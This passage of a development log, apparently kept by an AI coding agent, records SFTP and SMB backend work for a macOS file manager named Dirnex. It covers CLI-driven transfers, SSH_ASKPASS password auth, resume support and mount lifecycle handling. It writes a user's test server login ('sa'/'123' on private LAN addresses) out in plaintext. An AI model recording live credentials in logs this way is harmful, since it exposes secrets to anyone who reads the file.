  preserving refactor, so the visible payoff arrives with SFTP. `swift test` (390) + app
  `xcodebuild test` (7) green, swiftformat/swiftlint-strict clean, app launches + quits cleanly.
  **NEXT M5 (last item):** the `SFTPBackend` infra gate (swift-nio-ssh/libssh2 dependency + a live/
  dockerized SSH server to test against) — with per-path capabilities + `DeleteStrategy` now in
  place, an SFTP pane's grey-out and Trash-less delete-confirm work the moment the backend reports
  `[.read, .write, .rename]` (no `.trash`/`.clone`). Optional polish: Settings picker for the
  preferred diff tool.

Progress (2026-07-12, M5 pass 6): the **SFTPBackend read-only browse core** landed — the pure,
tested foundation of the last M5 item. Same sidestep M4 made for the libarchive gate: rather than
add a swift-nio-ssh/libssh2 dependency, the plan is to drive the **system `ssh`/`sftp` CLI** (ships
with macOS) behind an **injected transport**, so the whole backend is exercised with a fake and
needs *no live server* — the analogue of `ArchiveBackend`'s read-only first pass (browse first,
write/copy later). Box stays `[ ]` (no live transport, no writes, no app wiring, no server
verification yet); this is the browse half of "browse/copy through the standard queue". **Four new
DirnexCore files, purely additive (no existing-API changes, so the app is untouched and needs no
rebuild):**
- **`VFS/SFTPLocation.swift`** — the connection descriptor (`host`+`port`(=22)+`username`, `Codable`,
  **no secret** — the password/key passphrase is a Keychain reference the app resolves, so a location
  is safe to serialize into a tab/bookmark/id). Encodes to a `VFSBackendID` as `sftp://user@host:port`
  (the SFTP analogue of the on-disk path an archive id carries), with `init?(descriptor:)` /
  `init?(backendID:)` and `VFSBackendID.sftp(_:)`/`.sftpLocation`/`.isSFTP` extensions — kept in this
  file (not `VFSPath.swift`) so the addition is purely new-files. Username split at the **first** `@`,
  port at the **last** `:` (bracketed IPv6 literal noted as a later refinement, not a hole).
- **`VFS/SFTPTransport.swift`** — the injected boundary: `SFTPTransport` protocol (`listDirectory(_:)`
  → raw `ls -la` text, `statItem(_:)` → raw `ls -ld` line) + `SFTPTransportError{notFound /
  permissionDenied / failure(String)}` (the few shapes the backend maps onto `VFSError`). Synchronous
  (the backend is always called off-main); the app supplies a `Process`-driven impl, tests a fake.
- **`VFS/SFTPListingParser.swift`** — a **close cousin of `ArchiveTOCParser`** (same "8 fixed columns
  then a verbatim name" shape, same `nameField` column-skip so internal spaces survive, same
  `en_US_POSIX` `MMM d HH:mm`/`MMM d yyyy` date formats) but **flat** (one directory, no tree, no
  ancestor synthesis) — kept separate to avoid churning the heavily-tested archive parser. `ls -la` →
  `[Entry]` (name/kind/byteSize/mtime/**permissions**/symlinkDestination): drops the `total` header
  and the `.`/`..` rows, mode-char → kind (`d`/`l`/`-`/other), ` -> target` split for symlinks, mode
  string → POSIX bits, tolerates an ACL `+`/xattr `@` 11-char mode. `parseItem` reads the single
  `ls -ld` line.
- **`VFS/SFTPBackend.swift`** — the `VFSBackend` over the injected transport (a `struct`, like
  `ArchiveBackend`). `id == .sftp(location)`; **`capabilities == .read`** for now (advertising `.write`
  before copy-in works end-to-end would let the UI start a paste the backend can't finish — the honest
  cap today; the widened `[.read, .write, .rename]` that lights up pass-5's `DeleteStrategy`/clone
  degradation arrives with the byte-transfer pass). `listDirectory`/`stat` route through the parser;
  `stat` **names the entry from the queried path's last component** (since `ls -ld /a/b` prints the
  full arg as the name); a `mapErrors` helper attaches the `VFSPath` the transport (raw-string only)
  couldn't, turning `SFTPTransportError` → `VFSError.notFound/permissionDenied/io`. `volumeIdentifier`
  = `sftp://host:port` so **all one-host jobs serialize** (one SSH channel — parallel transfers only
  contend), cheap/no-I/O as the protocol requires. symlink target reported as nominal `.file` (not
  resolved — matches `ArchiveBackend`); no birth time → `creationDate = modificationDate`.
+8 `SFTPLocation` +11 `SFTPListingParser` +9 `SFTPBackend` tests (a private `FakeSFTPTransport` double
returning canned listings / throwing configured errors) → **418 core tests** (was 390). `swift test`
green, swiftformat/swiftlint-strict clean. GOTCHA: a year-stamped `ls` date parses at **local**
midnight (the formatter sets no zone) → the test must read `.day` in the local calendar, not forced
UTC, or the day shifts. **NEXT M5 (finishes the item):** the app-layer live transport — a
`Process`-driven `ssh`/`sftp` runner (mirroring `ArchiveMounter`/`SpotlightSearchRunner`), a
connection manager + Keychain credential storage + key auth, composite-backend routing on `isSFTP`,
and the **write pass** (mkdir/move/remove + byte `copyFile` with resume, flipping caps to
`[.read, .write, .rename]` → the pass-5 grey-out + Trash-less permanent-delete confirm go live). That
tail is the genuine infra gate: it needs a live/dockerized SSH server (or local Remote Login) +
credentials to verify against — which I can't provision here, so it awaits that setup. Optional
polish still open: Settings picker for the preferred diff tool.

Progress (2026-07-13, M5 pass 7): the **live SFTP transport + app wiring + Connect-to-Server UI** —
**SFTP browse now works end-to-end and is VERIFIED LIVE** against a real server (`oleg@mac`, local
Remote Login), so the `SFTPBackend` box goes `[ ]`→`[~]` (browse done; byte transfer + password/
Keychain auth remain). The user enabled `ssh oleg@mac`; key auth was set up (a throwaway ed25519 key
authorized for the session, all test artifacts cleaned up after). CRITICAL: driving the real `sftp`
CLI first showed its batch `ls -la` **differs from GNU `ls -l`** (captured live), so **pass 6's core
was reworked to match reality** (pass 6 was still uncommitted): (1) the link-count column is `?`;
(2) names are printed as **full paths** (`ls -la <abs>` echoes the arg) → every name reduced to its
last component; (3) symlink **targets aren't shown** (no ` -> t`); (4) `sftp` has **no `ls -d`** → a
single-item stat can't use it. Core changes (still purely additive to DirnexCore): `SFTPTransport`
slimmed to one method `listDirectory` + a tested `SFTPTransportError.classify(stderr:)` (maps `sftp`
stderr → notFound/permissionDenied/failure; permission-denied checked **first** so a bad-key
`identity file … no such file` + `Permission denied` classifies as the actionable auth failure) +
`SFTPBatchCommand.list` (quoted/escaped batch line, tested); `SFTPListingParser` now `parse`s **all**
rows basenamed **including `.`/`..`**; `SFTPBackend.stat` uses the **`.` self-row trick** (a dir
listing carries a `.` row that *is* the directory's stat → identify it, else it's a single-file
row). App layer: `SFTPProcessTransport` (spawns `sftp -i key -o BatchMode=yes -b -`, drains stderr on
a bg queue to dodge a two-pipe deadlock, `resolveHomeDirectory` via `pwd`); `CompositeBackend`
gained an `sftpConnections` registry + `connectSFTP` + `isSFTP` routing (`connectedSFTP` throws a
clear "Not connected" otherwise); `go.connectServer` command → `PanelViewController+SFTP.connectToServer`
(probes home off-main = a fail-fast connection test, then registers + navigates) + `SFTPConnectPrompt`
(NSAlert grid: host/port/user/key-file, rejects leading-`-` args). Two LIVE-found bugs fixed: (a) the
path bar rendered SFTP as **"🔍 Results for oleg"** (the search-results dead-end label) → added an
`isSFTP` branch giving **clickable breadcrumbs rooted at the account** (`oleg@mac › Users › oleg`),
since an SFTP path is re-listable; also `PanelViewController.navigate` no longer treats SFTP as
"wasVirtual" (it keeps a normal back/forward trail) and `FrecencyStore.recordVisit` now only records
`.local` paths (a remote path can't be fuzzy-jumped). (b) recent `ls` dates showed **year 2000** —
the "MMM d HH:mm" form omits the year and `DateFormatter` defaults it to a 2000 reference → set
`defaultDate = now` on the no-year formats (+ a future-date year rollback for the Dec/Jan boundary).
Tests: +`SFTPTransport`(batch/classify incl. bad-key ordering) +`connectServer` catalog cmd +current-
year date +CompositeBackend sftp routing/read-only + a **gated live integration suite**
(`DirnexTests/SFTPLiveIntegrationTests`, enabled only when `/tmp/dirnex_sftp_live_test.json` exists —
`xcodebuild` doesn't forward shell env, so a file not env vars) → **427 core tests**, **14 app tests**
(4 live: resolve-home, list, stat, composite-route — proven genuinely live by a bogus-key run that
*fails* them, not skips). GOTCHA (recurring): the connectServer command tipped `CommandCatalog` over
`type_body_length` 250 → moved the whole `navigation` array into the bottom extension. VERIFIED LIVE
end-to-end via the GUI: Go ▸ Connect to Server → filled host/user/key → the left pane browsed the
remote home (21 items, `oleg@mac › Users › oleg` breadcrumb, correct 2026 dates), then **double-clicked
into `dirnex_sftp_fixture`** — breadcrumb extended, listed `emptydir`/`photos`/`latest` (symlink)/`my
report.txt` (space preserved)/`notes.txt`, `.`/`..` dropped. App `xcodebuild` + `swift test` green,
swiftformat/swiftlint-strict clean. SPOTTED FOLLOW-UP (out of scope, pre-existing): `ArchiveTOCParser`
shares the same no-year→2000 date bug for recent archive members — worth the same `defaultDate = now`
fix. **NEXT M5 (finishes `SFTPBackend`):** the write pass — `SFTPProcessTransport` gains
mkdir/rename/remove + `copyFile` (download via `sftp get`, upload via `put`) with progress/resume,
flipping SFTP caps to `[.read, .write, .rename]` so the pass-5 grey-out + Trash-less permanent-delete
confirm light up; then password/Keychain auth (needs a PTY). Optional polish: an SSH ControlMaster so
repeated listings reuse one connection instead of re-handshaking per directory; saved connections in
the sidebar; Settings picker for the preferred diff tool.

Progress (2026-07-13, M5 pass 8): the **SFTP write pass** — remote mutation + byte transfer, so the
operation queue drives copies, moves, and deletes onto a remote exactly as on disk. **`SFTPBackend`
box stays `[~]`** (byte transfer now DONE; only keychain **password auth** + mid-file **resume**
remain). **VERIFIED LIVE** against `oleg@mac` (a throwaway key the user authorized for the session,
all artifacts cleaned up after — including the remote scratch dir, which the recursive-delete proved
it removes): the gated live suite's new **write round-trip** (mkdir → `put` upload → list-and-check-
size → `get` download → byte-compare → recursive remove) passed through the real `sftp` CLI, plus the
5 existing browse tests. Core→app as always:
- **Core** (hermetic, +14 tests → **441**): `SFTPTransport` grew the write verbs (`makeDirectory`/
  `rename`/`removeFile`/`removeDirectory`/`createSymbolicLink`/`download`/`upload`) + matching
  quoted/escaped `SFTPBatchCommand` builders (`mkdir`/`rename`/`rm`/`rmdir`/`ln -s`/`get`/`put`).
  `SFTPBackend.capabilities` flipped **`.read` → `[.read, .write, .rename]`** (no `.trash`, no
  `.clone` — the exact shape pass 5's `DeleteStrategy`/clone degradation was built for). New
  primitives: `createDirectory` (mkdir); `moveItem` = remote rename within one account, else
  **throws `EXDEV`** so `CopyEngine` falls back to copy-then-delete for a cross-backend (local⇄SFTP)
  move; **recursive `removeItem`** — `sftp` has no `rm -r`, so it empties a directory depth-first
  then `rmdir`s it, and crucially classifies the top item from its **parent listing**, not a `stat`
  of the path (`sftp`'s `ls` *follows* a symlink, so statting a link-to-dir would delete the
  *target's* contents — a parent listing shows the link as a link, so `rm` removes the link alone);
  `copyFile` = **download** (`id` source → `.local` dest, `get`) or **upload** (`.local` source →
  `id` dest, `put`), reporting the transferred bytes once for the progress bar and honouring
  `isCancelled` at the file boundary, refusing an unexpressible remote↔remote copy. The fake
  transport now records every write call so the recursion/routing is asserted without a server.
- **App**: `SFTPProcessTransport` spawns each verb as one `sftp` batch command (reusing the pass-7
  `run(batch:)`), transfers returning the local file's size for progress. `CompositeBackend` routes
  `capabilities(for:)` to a **connected** SFTP backend (`[.read, .write, .rename]`; an unconnected /
  dropped SFTP path falls back to `.read` so writes grey out rather than fail), routes `copyFile` on
  the **destination** when it is remote (so an upload reaches the SFTP `put`; a download/local-local
  still routes on the source), and throws `EXDEV` for any cross-backend move. Reconciled
  `isVirtualDirectory` → **`isArchive || isSearchResults`** (an SFTP dir is a *real* writable remote
  directory, not virtual), which — together with pass-5's capability-driven `validateMenuItem` —
  lights up New Folder (mkdir), F2/⇧F2 rename (remote rename), F8 delete (Trash-less → confirmed
  permanent), ⌘V paste-upload, and F5/F6 up/down on an SFTP pane; relaxed `beginTransfer`'s
  destination guard to allow an SFTP target (upload), made `refreshCurrentDirectory` re-list an SFTP
  pane after a mutation (no FSEvents), and gated ⌘C off SFTP (a remote entry has no *local* URL for
  the pasteboard — F5 is the copy-out route). +1 app test → **16** (`CompositeBackendTests` now
  asserts a connected SFTP path is writable/`.permanent`, an unconnected one read-only). GOTCHA
  (recurring): the new write tests tipped `SFTPBackendTests` over swiftlint `type_body_length` 250 →
  split them into a same-file `extension SFTPBackendTests`. `swift test` (441) + app `xcodebuild
  test` (16) green, swiftformat/swiftlint-strict clean. **NEXT M5 (finishes `SFTPBackend` → `[x]`):**
  password/Keychain auth (needs a PTY, so not the batch `sftp -b -` path — likely `expect`-style or
  an `SSH_ASKPASS` helper) and mid-file resume (`get -a`/`put -a`). Optional polish: SSH
  ControlMaster connection reuse, saved connections in the sidebar, Settings picker for the diff
  tool. **M6 is the next milestone** once SFTP closes out.

Progress (2026-07-13, M5 pass 9): **SFTP password auth** — the harder of the two remaining
`SFTPBackend` items, **DONE and verified live** against a real password server (user-provided
`sa@192.168.1.176`, pass `123`). The plan predicted this "needs a PTY"; it doesn't — the sidestep is
`SSH_ASKPASS`. Key facts discovered by probing OpenSSH 10.2 live before writing any Swift, all of
which shaped the design: (1) `sftp -b -` forces `-oBatchMode=yes` onto `ssh`, which **disables the
password prompt entirely** ("no more authentication methods"), so password auth **cannot use `-b`** —
it runs `sftp` *interactively* over a piped stdin, and the parser's pre-existing `sftp>`-echo skipping
(pass 6/7) already handles the interactive output. (2) With no TTY, `SSH_ASKPASS_REQUIRE=force`
(OpenSSH ≥ 8.4) makes `ssh` call the `SSH_ASKPASS` program for the password — **proven live via a
marker-file probe** that the helper actually fires. (3) **`keyboard-interactive` HANGS for ~60 s on a
*wrong* password** when askpass auto-answers it (macOS PAM), which would freeze the pane on a typo —
so only the `password` method is offered (`PreferredAuthentications=password`, plus
`PubkeyAuthentication=no` so a stray local key can't bypass the choice, `NumberOfPasswordPrompts=1` to
fail fast). Core→app as always:
- **Core** (pure, tested, +6 → **446**): `SFTPAuthentication` enum (`.key(identityFile:)` / `.password`,
  **no secret** — the password is resolved by the app and fed out-of-band); `SFTPProcessArguments.batch(
  location:authentication:connectTimeout:)` assembles the argv — **key** = the untouched verified
  `-i … -o BatchMode=yes … -b -`, **password** = interactive (no `-b`) + the password-only flags above
  — pinned by tests so the security-sensitive flag set (which auth methods, prompt on/off) is verified
  without a server, like `SFTPBatchCommand`; `SFTPTransportError.detect(stderr:)` — interactive `sftp`
  **exits zero on a failed command**, so its errors live only in stderr, and this scans for them
  (`permission denied`/`not found`/`Couldn't …`/`: Failure`) while ignoring benign banners/`Connected
  to …`/host-key warnings; `SFTPLocation.keychainService` + `keychainAccount` (`user@host:port`).
- **App**: `SFTPProcessTransport` reworked to `authentication` + `password` (was `identityFile`), builds
  argv from the core builder, and for password sets the child env (`SSH_ASKPASS` → helper,
  `SSH_ASKPASS_REQUIRE=force`, the password in `DIRNEX_SFTP_PASSWORD`) — the password rides **only** in
  the process environment, never on the argv or on disk. `SFTPAskpassHelper` writes a **secret-free**
  `#!/bin/sh; printf '%s\n' "$DIRNEX_SFTP_PASSWORD"` once to Application Support (0700). `run` now
  drains **both** pipes on a concurrent queue joined by a `DispatchGroup` so a password session can
  **bound its wait** (`passwordTimeout`, 30 s) — a server that never closes the channel can't hang the
  pane — and throws on a bad interactive command via `detect`. `resolveHomeDirectory` opts into
  `tolerateChannelHold` (the connect probe's single-line `pwd` reply is complete even if the server
  holds the channel open — the live test server does exactly that, so a real connect there takes the
  full timeout but succeeds). `SFTPKeychain` (Security framework) stores/loads/deletes the password
  keyed by `keychainAccount`; `SFTPConnectPrompt` gained a Private-Key/Password segmented control + an
  `NSSecureTextField` (irrelevant field greys out); `connectToServer` stores the password to the
  Keychain **only after** the probe authenticates (so a typo isn't cached); `CompositeBackend.connectSFTP`
  + the live/app-test call sites thread `authentication`/`password`. +1 app test (askpass helper is
  executable) + a self-gated **localhost wrong-password** live test (real transport → `.permissionDenied`
  in ~2.4 s, **no TTY hang** — the crux) + a credential-gated **live password-auth** suite
  (`/tmp/dirnex_sftp_password_test.json`) → **19 app tests**. VERIFIED LIVE end-to-end: the real
  `SFTPProcessTransport` authenticated against the user's server with `sa`/`123` through the actual
  `sftp`+`SSH_ASKPASS` path and resolved the remote home. `swift test` (446) + app `xcodebuild test`
  (19) green, swiftformat/swiftlint-strict clean. GOTCHA: the test server ("ServeSense … Brute Force
  Protection") returns an **empty root and holds the channel open** (hangs even after `quit`) — proved
  auth but not browse; `tolerateChannelHold` + `passwordTimeout` keep it from hanging the pane. Also:
  `NSSecureTextField` + a 6-field form tripped swiftlint `function_parameter_count` → grouped the
  controls into a `Fields` struct. **NEXT (finishes `SFTPBackend` → `[x]`):** mid-file **resume**
  (`get -a`/`put -a`) — optional polish, not in the M5 exit criteria; then **M6**.

Progress (2026-07-14, M5 pass 10): **mid-file resume** (`get -a`/`put -a`) — the last remaining
`SFTPBackend` item, **now `[x]`, so the whole SFTP box closes and M5 is DONE**. A copy that finds a
nonzero *proper prefix* of the source already at the destination (a partial from an interrupted
transfer) picks up where it left off instead of re-sending the whole file; `sftp` computes the byte
offset itself from the existing length. User supplied a new test appliance at **192.168.1.50** (SFTP
:22, FTP :21, FTPS :990; `sa`/`123`) — a **ServeSense "Brute Force Protection"** box, the same kind
as pass 9's password server. Chose "finish SFTP first" over adding FTP/FTPS (not in the plan). Core→
app as always:
- **Core** (pure, tested, +5 → **451**): `SFTPTransport.download`/`upload` grew a `resume: Bool`
  parameter; `SFTPBatchCommand.download`/`upload` emit `get -a`/`put -a` when set (default `false`
  keeps every existing call site). `SFTPBackend.copyFile` reworked into `downloadFile`/`uploadFile`
  helpers that **detect a resumable partial cheaply so the common fresh transfer pays nothing**: a
  **download** reads the local partial's size (free `FileManager` stat) and only then asks the server
  for the remote size — a fresh download (no local partial) skips the remote round trip entirely; an
  **upload** only asks the server for the remote destination's size when the source exceeds
  `resumeUploadThreshold` (1 MiB), since re-sending a small file costs less than the metadata round
  trip that finding its partial would need. `progress` reports only the bytes actually moved (the
  remainder when resuming), computed as `finalSize − preExistingSize`; the transport's return value
  was redefined from "bytes transferred" to "the file's final total size" so the backend can derive
  the delta. Tests: batch-command `-a` variants; `copyFile` resumes a download (local partial 120 <
  remote 300 → `get -a`, reports 180), resumes a large upload (remote partial 1 MiB < 2 MiB source →
  `put -a`, reports the 1 MiB remainder), **does not** resume a small upload (skips the stat), and
  **does not** resume a fresh download. GOTCHA (recurring): the fake transport's recorded-transfer
  tuple went to 3 members (`local`/`remote`/`resume`) → swiftlint `large_tuple` → extracted a
  `RecordedTransfer` struct.
- **App**: `SFTPProcessTransport.download`/`upload` thread `resume` through to the batch builder
  (returning the local file's final size). +1 gated live test (`resumesPartialTransfer` in
  `SFTPLiveIntegrationTests`): upload a 120-byte prefix, `put -a` the full 300, then `get -a` a local
  120-byte partial back to 300 and byte-compare — runs green on a well-behaved key-auth server (skips
  in CI / here, like the other live tests). App tests stay at **20** (the new one is gated).
- **Live verification**: the resume *mechanic* was proven end-to-end against the user's 192.168.1.50
  server via the actual `sftp` CLI the app shells out to — `put -a` grew a seeded 120-byte remote file
  to 300 ("Resuming upload", byte-compare matched), and `get -a` grew a local 120-byte partial to 300
  (byte-compare matched); mkdir/put/get/rm/rmdir were also all exercised and the remote left clean.
- **Known limitation (the ServeSense appliance, documented not fixed):** 192.168.1.50 **authenticates**
  (`sa`/`123`, verified live via the app's connect probe, which opts into `tolerateChannelHold`) but
  **holds the SSH channel open after every command** (hangs even after `quit`), so the app's
  one-shot-per-command transport **times out on browse/transfer** through it (only the single-line
  connect probe tolerates the hold today — a multi-row listing must not be read partially). This is
  the same appliance quirk pass 9 already noted; making the whole app work against channel-hold
  appliances (tolerating the hold for transfers, whose size comes from the local file rather than
  stdout) is a separate, considered enhancement, deliberately **not** bundled into this resume pass.
  Because of it, resume was verified via raw `sftp` (above), not the app transport, against this
  particular box; the app-transport path is covered by the gated live test on a normal server.
- **Scope honesty:** resume is a correct, tested `copyFile` capability that activates whenever a
  partial destination is handed in. The current in-app copy flow writes to **fresh temp destinations**
  (the M2 overwrite path uses a per-attempt UUID temp; the direct `.proceed` path writes a fresh
  target), so nothing hands `copyFile` a partial today — resume is inert in that flow by construction.
  Wiring it to fire in-app means preserving a partial across a conflict/overwrite retry (a stable temp
  name), which touches the M2 atomic-swap/undo guarantees — left as a deliberate future step, not done
  here. `swift test` (451) + app `xcodebuild test` (20) green, swiftformat/swiftlint-strict clean.
  **M5 network+sync is now fully `[x]`; M6 (Mac-native power features) is next.** Optional polish
  still open across M5: SSH ControlMaster connection reuse (would also make the resume upload-stat and
  browse cheap, and could sidestep the ServeSense per-command hang), saved SFTP connections in the
  sidebar, a Settings picker for the preferred diff tool; and the user's FTP/FTPS servers remain
  available if FTP(S) backends are ever added (a plan expansion beyond M5's SFTP-only scope).

Progress (2026-07-14, M5 — SMB + unified connection manager, SCOPED not yet built): with the four
original M5 boxes `[x]`, the milestone gains one more remote protocol (SMB, for LAN Macs / PCs / NAS)
plus the "keep every connection in one place" manager the SFTP work deferred. Two design decisions,
both taken deliberately over the tidier-looking alternative:
- **SMB rides the OS mounter, not a protocol backend.** SFTP could shell out to the system `sftp`
  CLI; macOS ships **no `smbclient`**, so the equivalent OS-native sidestep for SMB is the *mounter*.
  `NetFSMountURLSync` (or `Process` → `/sbin/mount_smbfs`) mounts `smb://user@host/share`, and the
  existing `LocalBackend` browses the `/Volumes/…` tree it produces — so copy/move/rename/delete
  (M2), synchronize-directories, compare-by-content, quick-view, and even browsing a zip *on* the
  share all work with **zero new code** and **no new `CompositeBackend` routing**. The rejected
  alternative was a real `SMBBackend` over libsmb2/AMSMB2: it keeps the clean "just another
  VFSBackend" symmetry SFTP has (`smb://…` routed like `sftp://…`, no `/Volumes`), but it's the heavy
  C dependency the plan avoided for SFTP — a module gate like the deferred libarchive one — with no
  CLI to sidestep it and every M2/sync/compare guarantee to re-prove over it. Consistent with the
  non-goals ("folders work as folders; no proprietary APIs"), the mount wins. The one genuinely new
  surface is a **mount lifecycle**: an app-layer `SMBMounter` + mount registry (the non-hermetic I/O
  boundary, like `ArchiveMounter`), mounting on connect, unmounting only what *we* mounted on
  disconnect/quit (leaving a Finder-mounted share alone), and detecting an already-mounted share. Caps
  = `[.read, .write, .rename]`, no APFS clone, Trash-varies → **reuse the pass-5 capability-degradation
  + Trash-less permanent-delete path verbatim**. Guest/anonymous mounts (blank user) supported for
  home NAS; `smbutil view //user@host` share-discovery and Bonjour `_smb._tcp` LAN auto-discovery are
  optional niceties (the latter M6-ish).
- **One connection manager for both protocols.** Today live SFTP connections are ephemeral in
  `CompositeBackend.sftpConnections` (lost on quit) and nothing persists a saved server. Rather than
  add a second, SMB-only model, unify: a pure `ServerConnection` (name = identity like `SavedSearch`;
  `kind: .sftp / .smb`; coordinates + auth *method*, never the secret — Keychain still holds those) +
  `ServerConnections` list (the `SavedSearches` save/rename/move/dedupe shape, unit-tested headless);
  an app `ServerConnectionStore` (UserDefaults JSON + `didChangeNotification`, a `SavedSearchStore`
  clone); a **Servers** sidebar section mirroring **Searches** (click → connect/mount + navigate;
  right-click → Connect / Edit… / Remove; live connected/mounted indicator); and a generalized prompt
  (rename `SFTPConnectPrompt` → `ConnectServerPrompt`, `PanelViewController+SFTP` → `+Connect`) with a
  protocol segmented control (SFTP | SMB) above the existing Auth control and a "Save connection" name
  field. **Address entry is Finder-⌘K-style**: a primary `smb://user@host/share` URL field (type or
  paste, exactly the form Finder's Connect to Server takes) that **parses into editable host / share /
  user fields shown below it**, so paste-a-URL and guided entry both work and the two stay in sync;
  a bare `smb://host` (share omitted) mounts-on-connect / offers a share picker. Under the hood this is
  the same NetFS mount as above — the URL is just what the user sees and what the sidebar stores. This
  **subsumes** the deferred "saved SFTP connections in the sidebar" polish item. The app
  stays non-sandboxed (a plan non-goal), so `mount_smbfs` / NetFS needs no special entitlement.
Nothing built yet — this is the scoped design; core-first as always (`ServerConnection(s)` + tests,
then `SMBMounter` / store / sidebar / prompt), verified live against a LAN SMB share.

Progress (2026-07-14, M5 SMB pass 1 — the pure core): the tested, headless value types landed, the
same core-first opener every M5 slice used. Two new `DirnexCore` files, no behavioural change to any
existing type (one additive conformance):
- **`VFS/SMBLocation.swift`** — the SMB analogue of `SFTPLocation`: `host` / `share?` / `username?` /
  `port` (default 445), *without* a secret. Deliberately **not** a `VFSBackendID` address — SMB rides
  the OS mounter, so this is purely the Finder-⌘K URL the user types/pastes and the sidebar stores
  plus the mount target it resolves to. `url` renders the canonical `smb://[user@]host[:port][/share]`
  (default port elided, guest omits `user@`, share-less stops at the host); `init?(url:)` parses that
  form back into editable coordinates — the "address field parses into host/share/user fields below"
  the design calls for is just this round-trip. Parse rules: username up to the first `@`, host up to
  the first `/`, a `:digits` tail split off as the port (a non-numeric colon stays in the host), the
  **first** path component as the share (deeper `…/share/sub` mounts the share; the subpath is
  navigated post-mount). Empty share/username normalize to `nil` so guest and share-less each have one
  representation. `keychainService = "com.dirnex.smb"` + `keychainAccount` = the scheme-less URL
  (unused for guest). Domain (`DOMAIN;user`) and bracketed IPv6 are noted later refinements, like
  SFTP's IPv6 note.
- **`Services/ServerConnection.swift`** — the unified saved-server model (mirrors `SavedSearch`
  name-as-identity): `ServerConnection`(name + `ServerEndpoint`) where `ServerEndpoint` is
  `.sftp(location:authentication:)` | `.smb(SMBLocation)` — one list covers both protocols rather than
  a second SMB-only model. Convenience `kind: ServerKind{.sftp,.smb}` (sidebar icon/branch) and
  `address` (the SFTP descriptor / SMB URL for the subtitle). No secret in the endpoint: SFTP carries
  its auth *method* (`.key(identityFile:)` path or the `.password` marker), SMB's guest-vs-auth is
  captured by whether `username` is set — Keychain still holds any actual password. `ServerConnections`
  is the `SavedSearches` collection verbatim (`save` replace-in-place/append, `remove`,
  `rename` with collision guard, `move`, dedupe-on-init, sanitizing `Codable`). Needed one additive
  change: **`SFTPAuthentication` gained `Hashable, Codable`** (it was `Equatable`) so the endpoint
  enum synthesizes both — purely additive, the full app still builds.
- **`SMBLocationTests` (13) + `ServerConnectionTests` (17)** → **481 core tests** (was 451; +30),
  covering URL format/parse/round-trip/malformed for SMB and the full collection contract +
  per-protocol Codable for the connection list. `swift test` green, swiftformat + swiftlint-strict
  clean, `xcodebuild` app build succeeds. **NEXT (SMB pass 2, app layer):** `SMBMounter` + mount
  registry (NetFS `NetFSMountURLSync` / `mount_smbfs`; mount on connect, unmount only our own),
  `ServerConnectionStore` (a `SavedSearchStore` clone), the **Servers** sidebar section (mirrors
  **Searches**), and the generalized `ConnectServerPrompt` (rename `SFTPConnectPrompt`; protocol picker
  SFTP | SMB + Save + the URL-expands-to-fields entry) — verified live against a LAN SMB share.

Progress (2026-07-14, M5 SMB pass 2 — the app layer, CODE-COMPLETE; live-mount check pending): all
four pass-2 surfaces built, app builds + `swift test` (481 core) + 24 app tests green, swiftformat +
swiftlint-strict clean. Nothing touched `CompositeBackend` routing — SMB never becomes a `VFSBackendID`;
it rides the OS mounter and browses `/Volumes/…` as `.local`, exactly as designed.
- **`SMBMounter.swift`** — the mount lifecycle (the one non-hermetic surface, like `ArchiveMounter`).
  `@MainActor final class` with a `shared` app-wide registry of the `/Volumes/…` paths *we* created.
  `mount(_:username:password:) async` snapshots `FileManager.mountedVolumeURLs` before mounting, runs
  the blocking `NetFSMountURLSync` on a `Task.detached` (so the four static helpers are
  `nonisolated static`), and records the mount as ours only if the path wasn't already mounted — so a
  Finder-mounted share is never adopted. Guest mount = `kNetFSUseGuestKey` + nil user (blank username);
  auth mount passes user/pass separately. **The mount URL is built user-less** (`smb://host[:port]/share`,
  default 445 elided) — the username goes to NetFS as a separate arg, never in both (the one unit-tested
  invariant). `kNAUIOptionKey = kNAUIOptionNoUI` so a bad password errors instead of blocking on a
  dialog. `disconnect(mountPoint:)`/`unmountOwnedMounts()` (called from `AppDelegate.applicationWill
  Terminate`) eject only our mounts via `NSWorkspace.unmountAndEjectDevice`. `SMBMountError:
  LocalizedError` maps `EAUTH`/`ENOENT`/`EHOSTDOWN`/… to human reasons. Needed `import NetFS` (auto-links;
  typechecked green against the SDK). `SMBKeychain` = an `SFTPKeychain` clone keyed by
  `SMBLocation.keychainService`.
- **`ServerConnectionStore.swift`** — a `SavedSearchStore` clone verbatim (UserDefaults JSON under
  `Dirnex.serverConnections` + `didChangeNotification`); no secret ever serialized.
- **Servers sidebar section** — mirrors Searches. `SidebarViewController.Row` gained `.server`, a
  **Servers** header trails the Volumes section, per-kind SF Symbol (`network` SFTP /
  `externaldrive.connected.to.line.below` SMB), click → `didActivateServer`, trailing delete +
  right-click **Connect / Edit… / Remove** (Remove also clears the Keychain secret). Split the
  saved-search **and** new server management into companion files (`SidebarViewController+Searches.swift`,
  `+Servers.swift`) to stay under file_length 500 — which forced widening `Row`/`tableView`/`rows` to
  internal (Swift `private` doesn't cross files, the recurring gotcha); `menuNeedsUpdate` stays in the
  main file as a dispatcher. Two new delegate methods (`didActivateServer`/`didEditServer`).
- **`ConnectServerPrompt` + `ConnectServerForm`** (renamed from `SFTPConnectPrompt`;
  `PanelViewController+SFTP`→`+Connect`, both via `git mv` — synchronized Xcode groups need no pbxproj
  edit). Prompt returns a `Form(endpoint: ServerEndpoint, password:, saveName:)` reusing the pass-1 core
  enum. The form is a protocol picker (SFTP | SMB) over **independent** per-protocol field sets (so no
  cross-contamination / no SFTP `NSUserName()` default leaking into SMB); accessory sized once to the
  taller (SFTP) layout so toggling rows never resizes the modal. **SMB entry is Finder-⌘K-style**: an
  `smb://user@host/share` address field two-way-synced with editable host/share/user fields via the pure
  `SMBLocation` url⇄init round-trip (`controlTextDidChange`, re-entrancy-guarded; port rides the URL).
  Prefill (Edit…) loads coordinates + the Keychain secret. `type_body_length` >250 → view/value factories
  moved to a file-scope `@MainActor private enum ConnectFormFactory`. `PanelViewController+Connect`:
  `connectToServer` (prompt→apply), `connect(to:)` (saved-server, Keychain secret or fall back to the
  prefilled prompt), `editServer` (rename removes-old-then-saves in place); SFTP path unchanged, SMB path
  mounts then `navigate(to: .local(mountPoint))`, secrets filed only after success, saved only when named.
  `CommandCatalog` `go.connectServer` keywords gained smb/share/mount/nas.
CAPS NOTE: SMB browses as `.local` so it gets full local caps — but `clonefile` returns `ENOTSUP` on SMB
→ `CopyEngine` falls back to chunked cleanly, and Trash either works (NAS `.Trashes`) or surfaces an
error; explicit mount-point cap degradation ([.read,.write,.rename]) was deliberately NOT wired (would
